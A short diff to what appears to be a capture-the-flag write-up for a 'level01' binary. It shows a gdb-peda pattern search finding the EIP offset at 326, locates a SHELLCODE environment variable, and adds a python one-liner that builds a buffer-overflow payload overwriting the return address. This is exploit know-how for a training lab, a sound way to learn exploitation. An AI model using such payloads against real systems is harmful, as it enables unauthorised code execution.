@@ -26,7 +26,11 @@ gdb-peda$ pattern search
   Registers contain pattern buffer:
   EIP+0 found at offset: 326
 
+./getenv SHELLCODE ~/level01
+  0x7fffffffe769
 
+echo "dat_wil" > exploit01
+python -c 'print "A" * 326 + "\x69\xe7\xff\xff\xff\x7f"' >> exploit01
 ```
 
 ## Sources
